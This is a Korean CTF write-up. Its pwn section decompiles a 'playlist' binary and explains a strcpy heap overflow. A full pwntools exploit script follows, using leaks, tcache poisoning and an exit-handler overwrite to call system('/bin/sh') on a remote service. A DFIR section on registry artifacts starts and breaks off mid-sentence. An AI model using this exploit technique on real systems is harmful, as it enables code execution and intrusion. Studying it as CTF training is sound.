작성자 : 조수호(shielder)

## pwn / playlist

```C
unsigned __int64 create()
{
  int i; // [rsp+0h] [rbp-120h]
  int v2; // [rsp+4h] [rbp-11Ch]
  int v3; // [rsp+4h] [rbp-11Ch]
  char *dest; // [rsp+8h] [rbp-118h]
  char s[128]; // [rsp+10h] [rbp-110h] BYREF
  char buf[136]; // [rsp+90h] [rbp-90h] BYREF
  unsigned __int64 v7; // [rsp+118h] [rbp-8h]

  v7 = __readfsqword(0x28u);
  if ( song_len <= 63 )
  {
    memset(s, 0, sizeof(s));
    memset(buf, 0, 0x80uLL);
    printf("Enter song name: ");
    v2 = read(0, buf, 0x80uLL);
    if ( buf[v2 - 1] == 10 )
      buf[v2 - 1] = 0;
    printf("Enter artist: ");
    v3 = read(0, s, 0x80uLL);
    if ( s[v3 - 1] == 10 )
      s[v3 - 1] = 0;
    if ( buf[0] && s[0] )
    {
      dest = (char *)malloc(0x100uLL);
      if ( dest )
      {
        strcpy(dest, buf);
        strcpy(dest + 128, s);
        for ( i = 0; i <= 63; ++i )
        {
          if ( !song_chunk[i + 8] )
          {
            song_chunk[i + 8] = (__int64)dest;
            break;
          }
        }
        ++song_len;
        puts("Song added to playlist!");
      }
      else
      {
        puts("Memory allocation failed!");
      }
    }
    else
    {
      puts("Invalid input!");
    }
  }
  else
  {
    puts("Playlist is full!");
  }
  return v7 - __readfsqword(0x28u);
}
```

`create`의 `strcpy`에서 힙 오버플로우가 발생한다. 이를 이용해서 size 조작을 할 수 있고, 서로 다른 위치에 있는 unsorted bin이 두 개 있으면 힙주소도 저장되기 때문에 립씨, 힙릭 모두 가능하다. 익스는 `strcpy`가 null까지만 복사하고, null까지 복사하기 때문에 가장 편한 방법인 `exit handler overwrite`로 진행하였다.

## ex.py

```python
from pwn import *
from tqdm import *
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('-r', '--remote', action='store_true', help='Connect to remote server')
parser.add_argument('-g', '--gdb', action='store_true', help='Attach GDB debugger')
args = parser.parse_args()

gdb_cmds = [
    'set follow-fork-mode parent',
    'b *exit',
    'c'
]

binary = './prob'
 
context.binary = binary
context.arch = 'amd64'
# context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

if args.remote:
    p = remote("43.200.69.175", 31338)
else:
    p = process(binary)
    if args.gdb:
        gdb.attach(p, '\n'.join(gdb_cmds))
l = ELF('./libc.so.6')

def create(ctt1 : int, ctt2 : bytes):
    p.sendlineafter(b'> ', b'1')
    p.sendafter(b': ', ctt1)
    p.sendafter(b': ', ctt2)

def delete(idx : int):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b': ', str(idx).encode())

def read():
    p.sendlineafter(b'> ', b'3')

for i in trange(50):
    create(b'a', b'a')
delete(0)
create(b'a' * 8 + p16(0x551), b'a' * 0x80)
delete(1)
create(b'a', b'a') # 1
read()
p.recvuntil(b'2. ')
l.address = u64(p.recvn(6).ljust(8, b'\x00')) - 0x203b20
print(hex(l.address))

create(b'a', b'a') # 2
delete(2)
read()
p.recvuntil(b'50. ')
heap_base = u64(p.recvn(5).ljust(8, b'\x00')) << 12
print(hex(heap_base))

point_guard = l.address - 0x2890
initial = l.address + 0x204fc0
print(hex(point_guard))
print(hex(initial))
create(b'a', b'a') # 3
create(b'a', b'a') # 4
delete(3)
delete(2)
delete(1)
create(b'a' * 0x10 + p64(point_guard ^ (heap_base >> 12)), b'a' * 0x80)
for i in trange(7, 2, -1):
    delete(1)
    create(b'a' * (8 + i), b'a' * 0x80)
delete(1)
create(b'a' * 0x8 + p64(0x111), b'a' * 0x80)
create(b'a', b'a') # 2
create(b'a' * 0x8, b'a' * 1)
delete(13)
delete(2)
delete(1)
# p.interactive()
create(b'a' * 0x10 + p64((initial + 0x10) ^ (heap_base >> 12)), b'a' * 0x80)
for i in trange(7, 2, -1):
    delete(1)
    create(b'a' * (8 + i), b'a' * 0x80)
delete(1)
create(b'a' * 0x8 + p64(0x111), b'a' * 0x80)
create(b'a', b'a') # 2
binsh = list(l.search(b'/bin/sh'))[0]
sys_enc = rol(l.sym['system'] ^ u64(b'a' * 8), 0x11)
create(b'b' * 0x8 + p64(sys_enc) + p64(binsh), b'a' * 1)
idx = 15

for i in trange(7, 0, -1):
    idx += 1
    delete(idx)
    delete(2)
    delete(1)
    create(b'a' * 0x10 + p64((initial - 0x10) ^ (heap_base >> 12)), b'a' * 0x80)
    for j in range(7, 2, -1):
        delete(1)
        create(b'a' * (8 + j), b'a' * 0x80)
    delete(1)
    create(b'a' * 0x8 + p64(0x111), b'a' * 0x80)
    create(b'a', b'a') # 2
    create(b'c' * 0x20 + b'\x04' * i, b'a')
print(idx)
for i in trange(15, -1, -1):
    if i == 8 : i -= 1
    idx += 1
    delete(idx)
    delete(2)
    delete(1)
    create(b'a' * 0x10 + p64((initial - 0x10) ^ (heap_base >> 12)), b'a' * 0x80)
    for j in range(7, 2, -1):
        delete(1)
        create(b'a' * (8 + j), b'a' * 0x80)
    delete(1)
    create(b'a' * 0x8 + p64(0x111), b'a' * 0x80)
    create(b'a', b'a') # 2
    create(b'\x01' * (0x10 + i), b'a')
p.sendlineafter(b'> ', b'4\n')
p.interactive()
```

# dfir / 시나리오-1

`C:\Windows\System32\config\SYSTEM`에서 `ControlSet001/Control/ComputerName/ComputerName` 레지스트리에서 호스트 네임 `DESKTOP-ABDAIP8`를 확인할 수 있다.  `ControlSet001/Tcpip/Parameters/Interfaces` 레지스트리에서 IP `192.168.18.123`을 확인할 수 있다. `ControlSet001/Control/TimeZoneInformation`에서 KST를 사용함을 확인하고, `C:\Windows\System32\config\SOFTWARE`에서 `Microsoft/`